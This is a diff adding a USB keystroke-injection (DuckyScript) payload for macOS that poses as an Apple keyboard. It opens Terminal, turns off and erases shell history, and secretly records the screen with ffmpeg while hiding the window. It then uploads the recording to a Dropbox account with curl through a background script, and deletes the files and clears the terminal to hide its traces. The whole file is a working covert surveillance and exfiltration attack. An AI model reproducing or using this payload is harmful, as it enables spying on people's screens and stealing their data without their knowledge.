@@ -1,0 +1,87 @@
+REM This script records the screen and saves the recording as a .mkv file to the desktop.
+REM Converts the recording to an MP4 file and saves the MP4 file to the desktop.
+REM Then uploads the MP4 file to your Dropbox API, deletes the files on the desktop, and clears the terminal.
+
+REM Must have terminal recording privileges enabled in Privacy & Security settings 
+REM Script includes a delay of 10 seconds after starting the recording. 
+REM to allow for the desired recording duration. Can adjust the delay for longer recordings. line 35
+REM Delays for render time; if you adjust line 35, also adjust line 43 accordingly. 
+REM This will allow a adequate render time for the .mp4 
+
+REM Must have ffmpeg installed 
+REM You can download through the terminal using the 'brew install ffmpeg command'
+REM Replace "<USERNAME_HERE>" with system username 
+REM Replace "<Your API token Here>" with your API access token 
+
+
+REM Author: Narsty
+REM Title: Screen Recorder MacOs to Dropbox
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal 
+DELAY 1000
+ENTER
+DELAY 500
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
+ENTER
+DELAY 500
+STRING history -d $(history | tail -n 2 | head -n 1 | awk '{ print $1 }')
+DELAY 500
+ENTER
+DELAY 500
+ENTER
+DELAY 500
+STRING  ffmpeg -f avfoundation -r 30 -i "1" -c:v libx264 -preset ultrafast -tune zerolatency -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mkv
+DELAY 250
+ENTER
+GUI h        ; hides terminal to capture contents on the screen
+DELAY 10000  ; Delay for 10 seconds (adjust as needed)
+GUI TAB      ; reopens terminal to continue script
+DELAY 500
+CTRL C       ; Send the interrupt signal to stop the recording
+DELAY 500
+STRING  ffmpeg -i ~/Desktop/screen_recording.mkv -c:v libx264 -preset fast -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mp4
+DELAY 500
+ENTER
+DELAY 30000
+STRING  echo 'curl -X POST "https://content.dropboxapi.com/2/files/upload" -H "Authorization: Bearer <Your API token Here>" -H "Dropbox-API-Arg: {\"path\": \"/screen_recording.mp4\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary "@/Users/<USERNAME_HERE>/Desktop/screen_recording.mp4"' > upload.sh
+ENTER
+DELAY 500
+STRING  chmod +x upload.sh
+ENTER
+DELAY 500
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
+DELAY 500
+ENTER
+DELAY 10000
+STRING  rm ~/Desktop/screen_recording.mkv
+DELAY 250
+ENTER
+DELAY 3000
+STRING  rm ~/Desktop/screen_recording.mp4
+DELAY 250
+ENTER
+DELAY 500
+STRING  rm upload.sh
+DELAY 500
+ENTER
+DELAY 500
+STRING  clear
+ENTER
+DELAY 500
+GUI w
+DELAY 1000 
+ENTER
+
+
+
+
+
+
